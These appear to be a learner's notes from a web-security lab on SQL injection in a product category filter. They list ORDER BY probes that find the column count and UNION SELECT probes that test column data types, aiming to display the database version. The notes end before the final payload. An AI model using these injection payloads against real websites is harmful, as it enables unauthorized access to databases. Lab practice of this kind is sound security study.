SQL injection - Product category filter

Goals:
1- Display the database version string.

' ORDER BY 1-- -> error -> probably the database doesn't accept --
' ORDER BY 1#  -> 200 response -> displayed on the page
' ORDER BY 2#  -> 200 response -> displayed on the page
' ORDER BY 3#  -> error
The number of columns is 2

note: %23 is the # sing in the url form

Step #2: Determine the data type of the columns
' UNION SELECT 'a', NULL# -> string data type
' UNION SELECT NULL, 'a'# -> string data type
Both columns accept string data type
